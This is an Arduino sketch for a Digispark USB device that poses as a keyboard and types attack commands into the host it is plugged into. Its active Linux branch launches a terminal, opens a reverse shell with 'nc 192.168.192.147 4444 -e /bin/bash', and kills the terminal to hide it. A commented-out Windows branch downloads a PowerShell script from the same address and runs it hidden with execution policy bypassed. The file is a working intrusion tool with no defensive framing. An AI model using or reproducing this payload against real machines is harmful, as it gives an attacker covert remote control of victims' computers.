#include "DigiKeyboard.h"
#define KEY_TAB 0x2b

void setup() {
  pinMode(1, OUTPUT); // LED on Model A
}

void loop() {
  // Handshake
  DigiKeyboard.update();
  DigiKeyboard.sendKeyStroke(0);
  DigiKeyboard.delay(2000); 

  // Open Launcher (Windows Run or Linux Search)
  DigiKeyboard.sendKeyStroke(KEY_R, MOD_GUI_LEFT); 
  DigiKeyboard.delay(250); 

  // --- For Windows ---
  // DigiKeyboard.println(F("cmd")); 
  // DigiKeyboard.delay(400); 
  // // Executes, backgrounds, and closes the CMD window
  // DigiKeyboard.println(F("powershell -NoProfile -WindowStyle Hidden -Command \"$s=New-Object -ComObject WScript.Shell; iwr 'http://192.168.192.147/sc.ps1' -OutFile \\\"$env:TEMP\\sc.ps1\\\"; $s.Run(\\\"powershell -NoProfile -ExecutionPolicy Bypass -File `\\\"$env:TEMP\\sc.ps1`\\\"\\\", 0, $false)\" & exit"));

  // --- For Linux (Commented out) ---
  //To use this, replace the Windows section above.
  DigiKeyboard.println(F("Terminal")); // Or "xterm", "gnome-terminal" depending on the distro
  DigiKeyboard.delay(400);
  DigiKeyboard.println(F("nohup nc 192.168.192.147 4444 -e /bin/bash > /dev/null 2>&1 & kill -9 $PPID"));

  digitalWrite(1, HIGH); // Success indicator
  
  while(true) {
    DigiKeyboard.update();
    DigiKeyboard.delay(1000);
  }
}